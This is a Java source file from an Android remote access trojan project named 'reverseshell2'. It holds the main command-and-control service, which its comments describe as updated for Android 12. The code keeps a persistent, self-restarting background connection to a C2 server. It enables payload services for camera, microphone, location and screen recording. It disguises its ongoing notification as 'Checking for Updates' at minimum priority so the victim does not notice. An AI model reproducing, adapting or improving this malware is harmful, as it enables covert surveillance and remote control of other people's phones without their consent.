package com.example.reverseshell2;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

/**
 * Main C2 service, updated for Android 12.
 *
 * CRITICAL: On Android 12, the app CANNOT keep running in the background, and
 * the camera / mic / location / screen-record payload services CANNOT be
 * started from the background, unless this service is a FOREGROUND SERVICE.
 *
 * Changes for Android 12:
 *  1. START_FOREGROUND - calls startForeground() immediately in onStartCommand.
 *     This is REQUIRED because every other component (broadcastReciever,
 *     controlPanel, jumper) now starts this service via
 *     ContextCompat.startForegroundService(), which mandates startForeground()
 *     within 5 seconds or the system kills the app with
 *     ForegroundServiceDidNotStartInTimeException.
 *
 *  2. FOREGROUND SERVICE TYPE - On Android 11+ (API 30+) the foreground service
 *     type is declared explicitly. "connectedDevice" (or "specialUse" on
 *     Android 14+) covers a persistent network connection without a dedicated
 *     type. If you prefer, you can also use
 *     ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC.
 *
 *  3. START_STICKY retained - the system will restart the service if it is
 *     killed, which keeps the RAT reconnecting on Android 12.
 *
 *  4. Notification channel created with IMPORTANCE_LOW so the persistent
 *     notification is unobtrusive.
 *
 *  5. The connection is started on a background thread to avoid ANR.
 */
public class mainService extends Service {

    static String TAG = "mainServiceClass";
    private static final String CHANNEL_ID = "main_service_channel";
    private static final int NOTIFICATION_ID = 0x4A1E;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "in");

        // ------------------------------------------------------------------
        // CRITICAL (Android 12): startForeground() must be called within 5
        // seconds of startForegroundService(). This keeps the process alive in
        // the background and allows the payload foreground services (camera,
        // mic, location, screen record) to be started from the background.
        // ------------------------------------------------------------------
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+: use an explicit foreground service type.
            startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        // Start the C2 connection on a background thread (avoid ANR).
        Thread connectionThread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // jumper.init() restarts the C2 service / connection.
                    new jumper(getApplicationContext()).init();
                } catch (Exception e) {
                    Log.e(TAG, "jumper.init failed", e);
                }
            }
        });
        connectionThread.start();

        // START_STICKY: system restarts the service if it is killed.
        return START_STICKY;
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Checking for Updates")
                .setContentText("Fetching")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Background Service",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            stopForeground(STOP_FOREGROUND_REMOVE);
        } else {
            stopForeground(true);
        }
    }
}

